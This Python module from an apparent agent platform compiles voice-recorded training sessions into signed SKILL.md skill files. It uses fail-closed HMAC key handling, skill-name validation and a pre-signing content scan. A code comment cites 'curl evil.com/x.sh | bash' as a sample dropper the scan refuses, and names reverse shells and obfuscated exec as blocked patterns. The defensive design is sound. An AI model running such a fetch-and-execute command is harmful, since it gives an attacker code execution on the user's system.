"""Shared persistence helpers for the voice-training path.

Compile a SkillPackage from a recorded session and write it to the Neus
native skills directory as a SKILL.md file with governance metadata embedded
in the frontmatter. This makes voice-trained skills discoverable via the
same list_skills_native() path as agent-created skills.

Callers:
  - hermes.shell_server.training.api  (server-side sign endpoint)
  - hermes.shell.presentation.gtk4.widgets.training_panel  (in-session sign)

P0-4 signing strategy:
  - build_signing_key() (v1, path-HMAC) is retained ONLY for read-side
    reference — it must NEVER be used for signing new skills.
  - resolve_signing_key() returns the native keystore key (v2) — fail-closed.
    If master.key is absent the function RAISES SigningKeyError. There is no
    v1 fallback for signing: absence of master.key means hermes-keygen has not
    completed, which is a fatal misconfiguration, not a graceful degradation.
    hermes-keygen.service is declared Before=hermes-shell-server.service so
    its absence is always an operator error, never a transient condition.
"""

from __future__ import annotations

import hashlib
import logging
import os
import sqlite3
import tempfile
from pathlib import Path
from typing import Any
from uuid import UUID, uuid4

from hermes.agents_os.application.skill_compiler import SkillCompiler
from hermes.agents_os.application.training_session_orchestrator import (
    TrainingSessionOrchestrator,
    TrainingSessionState,
    VoiceCaptureRequired,
)
from hermes.training.domain.skill_md_document import VALID_NAME_RE, MAX_NAME_LENGTH


class InvalidSkillNameError(ValueError):
    """skill_name contains path-unsafe characters — write rejected."""

logger = logging.getLogger(__name__)


def _conn(db_path: Path) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path, isolation_level=None)
    conn.row_factory = sqlite3.Row
    return conn


def _neus_skills_root() -> Path:
    """Return the Neus native skills root: $HERMES_HOME/skills/."""
    hermes_home = os.environ.get("HERMES_HOME") or "/var/lib/hermes/hermes-home"
    return Path(hermes_home) / "skills"


def _validate_skill_name(name: str) -> None:
    """Reject skill names that fail VALID_NAME_RE (path traversal prevention).

    Called before building any filesystem path from a caller-supplied name.
    Raises InvalidSkillNameError on anything containing '/', '..', NUL, spaces,
    or uppercase — matching the same rule enforced by SkillMdDocument.__post_init__.
    """
    if not name or len(name) > MAX_NAME_LENGTH or not VALID_NAME_RE.match(name):
        raise InvalidSkillNameError(
            f"Invalid skill name {name!r}: must match {VALID_NAME_RE.pattern} "
            f"and be ≤{MAX_NAME_LENGTH} chars. Path traversal sequences are rejected."
        )


def _write_skill_md_atomic(skill_dir: Path, content: str) -> None:
    """Write SKILL.md to skill_dir atomically (tempfile + os.replace)."""
    skill_dir.mkdir(parents=True, exist_ok=True)
    target = skill_dir / "SKILL.md"
    fd, tmp_path = tempfile.mkstemp(dir=str(skill_dir), prefix=".SKILL.md.tmp.")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(content)
        os.replace(tmp_path, target)
    except Exception:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
        raise


def build_signing_key(db_path: Path) -> bytes:
    """Derive a stable HMAC key from the db path (deterministic per node).

    DEPRECATED — retained as a READ-ONLY reference for documentation
    purposes only. Must NEVER be called for signing new skills (CWE-321:
    the key equals SHA-256(public path) and is publicly derivable).
    Calling this function for signing is a security regression.
    """
    return hashlib.sha256(str(db_path).encode()).digest()


def resolve_signing_key(db_path: Path) -> tuple[bytes, str]:  # noqa: ARG001
    """Return (key_bytes, 'v2') for signing a NEW skill — fail-closed.

    Uses the native keystore (SecretsVault.derive_subkey via
    NativeKeyStoreAdapter) exclusively. If master.key is absent this
    function raises SigningKeyError rather than falling back to v1.

    Rationale: hermes-keygen.service is declared
      Before=hermes-shell-server.service
    so absent master.key is a fatal misconfiguration, not a transient state.
    Signing with a predictable path-derived key (v1) produces forgeable
    signatures and must be rejected unconditionally.

    Args:
        db_path: accepted for signature compatibility but ignored — the
                 signing key is derived from master.key, never from a path.

    Raises:
        SigningKeyError: if master.key is absent or corrupt.
    """
    from hermes.shell_server.skills.native_keystore_adapter import (  # noqa: PLC0415
        NativeKeyStoreAdapter,
    )

    adapter = NativeKeyStoreAdapter()
    return adapter.get_signing_key_sync(), "v2"


def next_version_for_skill(db_path: Path, skill_id: str) -> int:
    """Return the next monotonic version number for the given skill_id.

    .. deprecated::
        Use _next_version_atomic() inside compile_and_persist instead,
        which computes and reserves the version in a single transaction.
        This function remains for callers that need a read-only estimate.
    """
    with _conn(db_path) as c:
        row = c.execute(
            "SELECT MAX(version) AS v FROM skill_packages_view WHERE skill_id = ?",
            (skill_id,),
        ).fetchone()
    current = row["v"] if row and row["v"] is not None else 0
    return current + 1


def _next_version_atomic(
    conn: sqlite3.Connection, skill_id: str
) -> int:
    """Read MAX(version)+1 inside the *already-open* transaction on `conn`.

    Caller must hold a BEGIN IMMEDIATE so the read-then-write is serialized.
    """
    row = conn.execute(
        "SELECT MAX(version) AS v FROM skill_packages_view WHERE skill_id = ?",
        (skill_id,),
    ).fetchone()
    current = row["v"] if row and row["v"] is not None else 0
    return current + 1


def persist_signed_skill(
    db_path: Path,
    *,
    package_id: str,
    skill_id: str,
    skill_name: str,
    version: int,
    state: str,
    surface_kinds: str,
    signed_at: str,
    signature_short: str | None,
    signature_hex: str | None = None,
) -> None:
    """Upsert one row into skill_packages_view.

    signature_hex: full 64-char HMAC hex, stored for verification at
    promotion time. signature_short (first 12 chars) is kept for display.
    """
    with _conn(db_path) as c:
        c.execute(
            """
            INSERT OR REPLACE INTO skill_packages_view (
              package_id, skill_id, skill_name, version, state,
              surface_kinds, signed_at, signature_short, signature_hex
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                package_id,
                skill_id,
                skill_name,
                version,
                state,
                surface_kinds,
                signed_at,
                signature_short,
                signature_hex,
            ),
        )


def compile_and_persist(
    *,
    db_path: Path,
    orchestrator: TrainingSessionOrchestrator,
    session_id: UUID,
    skill_name: str,
    signed_at: str,
    voice_captions: list[str] | None = None,
    transcription_failed_ack: bool = False,
    generalized_body: str | None = None,
) -> bool:
    """Compile the in-memory session into a SkillPackage and persist it.

    Args:
        voice_captions:          aggregated transcripts from the coordinator
                                 (collected_voice_captions()).  When provided
                                 they are joined and fed into the compiler as
                                 the intent_caption, bridging the gap between
                                 coordinator._state.voice_captions and the
                                 compiled SkillPackage (findings 1/3).
        transcription_failed_ack: user acknowledged that Whisper failed;
                                  forwarded to orchestrator.sign().

    Returns True if a package was persisted, False if skipped (no steps).
    """
    try:
        sess = orchestrator.get_session(session_id=session_id)
    except Exception:
        logger.debug("compile_and_persist: session not in orchestrator; skipping")
        return False

    if not sess.steps:
        logger.debug("compile_and_persist: no steps; skipping")
        return False

    # SECURITY (red-team 2026-06-19): scan the recorded STEPS for trojan patterns
    # (dropper / reverse shell / obfuscated exec) BEFORE signing. A malicious demo
    # (e.g. "curl evil.com/x.sh | bash") is REFUSED here so it can never be minted
    # into a runnable, promotable skill. This is the CONTENT half of the Security
    # Center for skills — previously the gate only saw the skill NAME, never the
    # steps. The EXECUTION half (egress netns jail + terminal install-gate + broker
    # HITL) still applies at replay; this stops the clearest trojans at creation.
    from hermes.agents_os.domain.skill_content_scan import (  # noqa: PLC0415
        assert_skill_content_safe,
    )
    _content_steps = [
        {
            "surface_kind": getattr(s.surface_kind, "value", str(s.surface_kind)),
            "action_payload": getattr(s, "action_payload", {}) or {},
        }
        for s in sess.steps
    ]
    # Raises SkillContentBlockedError on a CRITICAL finding (propagates to the panel,
    # like VoiceCaptureRequired). Returns HIGH/MEDIUM findings for owner review.
    _content_findings = assert_skill_content_safe(_content_steps)
    if _content_findings:
        logger.warning(
            "compile_and_persist: skill %s has %d non-blocking content finding(s): %s",
            skill_name,
            len(_content_findings),
            [(f.pattern, f.severity.value) for f in _content_findings[:5]],
        )

    aggregated_caption = " · ".join(c.strip() for c in (voice_captions or []) if c.strip())

    # Firmar ANTES de compilar: esto centraliza el gate de voz (sign() lanza
    # VoiceCaptureRequired si la sesión requería voz y el transcript está vacío
    # sin ack) y mueve la sesión a SIGNED, que es lo que exige compiler.compile.
    # VoiceCaptureRequired se propaga al caller (panel) para avisar al usuario.
    if sess.state != TrainingSessionState.SIGNED:
        orchestrator.sign(
            session_id=session_id,
            human_confirmed=True,
            aggregated_caption=aggregated_caption,
            transcription_failed_ack=transcription_failed_ack,
        )
        sess = orchestrator.get_session(session_id=session_id)

    key, signing_method = resolve_signing_key(db_path)
    compiler = SkillCompiler(signing_key=key, extra_caption=aggregated_caption or None)

    try:
        pkg = compiler.compile(session=sess, version=1)
    except VoiceCaptureRequired:
        raise
    except Exception:
        logger.exception("SkillCompiler.compile failed session=%s", session_id)
        return False

    try:
        _persist_as_skill_md(
            pkg=pkg,
            skill_name=skill_name,
            signed_at=signed_at,
            signing_method=signing_method,
            generalized_body=generalized_body,
        )
    except Exception:
        logger.exception("compile_and_persist: SKILL.md write failed session=%s", session_id)
        return False

    logger.info(
        "skill_package.persisted package=%s skill=%s version=%s",
        pkg.package_id,
        pkg.skill_id,
        pkg.version,
    )
    return True


def _format_steps_procedure(pkg: "Any") -> "tuple[str, int]":
    """Serialize the compiled steps into a human/agent-readable procedure.

    The compiled SkillPackage carries the demonstrated actions in
    ``steps_by_surface_kind`` (navigate/click/type). Earlier this was dropped and
    the SKILL.md said only "Replay the recorded session steps" — an empty skill.
    Now each step becomes a numbered instruction the agent can actually follow.
    Returns (markdown_procedure, step_count).
    """
    bundle = getattr(pkg, "steps_by_surface_kind", None) or {}
    steps = [st for sk_steps in bundle.values() for st in sk_steps]
    return format_steps_lines(steps)


def format_steps_lines(steps: "list[Any]") -> "tuple[str, int]":
    """Format a flat list of TrainingSteps into a numbered, human-readable trace.

    Shared by the SKILL.md writer and the LLM generalizer (which feeds this trace to
    the model). Clicks use the captured element descriptor when present.
    """
    steps = sorted(steps, key=lambda s: getattr(s, "sequence_index", 0))
    if not steps:
        return "Replay the recorded session steps.", 0
    lines: list[str] = []
    for i, st in enumerate(steps, 1):
        ap = getattr(st, "action_payload", {}) or {}
        action = ap.get("action")
        if ap.get("kind") == "navigate" or ap.get("url"):
            lines.append(f"{i}. Navigate to {ap.get('url', '')}")
        elif action == "click":
            desc = _describe_element(ap.get("element"))
            if desc:
                lines.append(f"{i}. Click {desc}")
            else:
                lines.append(f"{i}. Click at ({ap.get('x')}, {ap.get('y')})")
        elif action == "key":
            lines.append(f"{i}. Type: {ap.get('text', '')}")
        else:
            lines.append(f"{i}. {action or ap.get('kind') or 'action'}: {ap}")
    return "\n".join(lines), len(steps)


def _describe_element(el: "Any") -> str:
    """Human label for a captured click target ('the button "Search"'), or '' if none.

    Turns the semantic descriptor (tag/role/text captured via elementFromPoint) into a
    readable, layout-independent instruction so the skill survives coordinate changes.
    """
    if not isinstance(el, dict) or not el:
        return ""
    tag = el.get("tag")
    label = {
        "a": "link", "button": "button", "input": "input field",
        "textarea": "text area", "select": "dropdown", "img": "image",
    }.get(tag) or el.get("role") or tag or "element"
    text = (el.get("text") or "").strip()
    if text:
        return f'the {label} “{text}”'
    if el.get("name"):
        return f"the {label} named '{el['name']}'"
    if el.get("id"):
        return f"the {label} #{el['id']}"
    return f"the {label}"


def _persist_as_skill_md(
    *,
    pkg: "Any",
    skill_name: str,
    signed_at: str,
    signing_method: str,
    generalized_body: str | None = None,
) -> None:
    """Write a SKILL.md for a voice-trained skill into the Neus skills dir.

    Produces a minimal-but-valid SKILL.md with governance metadata so the
    skill is discoverable via list_skills_native(). The body describes the
    session origin so the viewer shows something meaningful.

    Raises:
        InvalidSkillNameError: if skill_name fails VALID_NAME_RE — path traversal
            characters (/, .., NUL, spaces) are rejected before path construction.
    """
    _validate_skill_name(skill_name)
    import yaml as _yaml  # noqa: PLC0415

    surface_kinds = sorted(sk.value for sk in pkg.surface_kinds) if pkg.surface_kinds else []
    governance_meta: dict = {
        "package_id": str(pkg.package_id),
        "skill_id": str(pkg.skill_id),
        "state": pkg.state.value,
        "signing_method": signing_method,
        "signature_hex": pkg.signature_hex or "",
        "signed_at": signed_at,
        "validated_at": signed_at,
        "surface_kinds": surface_kinds,
        "version": pkg.version,
        # Fields required for HMAC re-verification (Finding #1 / CWE-345).
        # build_canonical_payload() in training.application.skill_signer uses all of
        # these. They may be absent on the agents_os.application.skill_compiler
        # SkillPackage variant (which has a different schema). Use getattr+default so
        # voice-trained skills are still written; the frontmatter will lack HMAC fields
        # and _skill_md_to_dto() will keep state as-is (key-unavailable path).
        "content_hash": getattr(pkg, "content_hash", None) or "",
        "tenant_id": str(pkg.tenant_id) if getattr(pkg, "tenant_id", None) else str(UUID(int=0)),
        "compiled_by_operator_id": str(getattr(pkg, "compiled_by_operator_id", None) or UUID(int=0)),
        "created_at": getattr(pkg, "created_at", None) and pkg.created_at.isoformat() or signed_at,
        "runtime_version": getattr(pkg, "runtime_version", None) or "",
        "replay_script_id": str(getattr(pkg, "replay_script_id", None) or UUID(int=0)),
        "voice_narrative_id": str(getattr(pkg, "voice_narrative_id", None) or UUID(int=0)),
        "decision_rule_ids": [str(r) for r in (getattr(pkg, "decision_rule_ids", None) or [])],
    }
    fm_dict: dict = {
        "name": skill_name,
        "description": f"Recorded skill (taught session {pkg.skill_id})",
        "version": str(pkg.version),
        "metadata": governance_meta,
    }
    frontmatter = _yaml.dump(fm_dict, default_flow_style=False, allow_unicode=True).rstrip()
    procedure, n_steps = _format_steps_procedure(pkg)
    if generalized_body and generalized_body.strip():
        # LLM-generalized skill (semantic, reusable) as the main body; keep the exact
        # demonstrated actions appended for traceability/exact replay.
        body = (
            f"{generalized_body.strip()}\n\n"
            f"## Demonstrated actions (verbatim)\n{procedure}\n\n"
            f"## Notes\nOrigin: teaching session `{pkg.skill_id}` "
            f"| {n_steps} step(s) generalized | surfaces: {', '.join(surface_kinds) or 'none'}\n"
        )
    else:
        body = (
            "## When\nUse this skill when the trained scenario is triggered.\n\n"
            f"## Procedure\n{procedure}\n\n"
            f"## Notes\nOrigin: teaching session `{pkg.skill_id}` "
            f"| {n_steps} step(s) | surfaces: {', '.join(surface_kinds) or 'none'}\n"
        )
    content = f"---\n{frontmatter}\n---\n\n{body}"
    skill_dir = _neus_skills_root() / skill_name
    _write_skill_md_atomic(skill_dir, content)
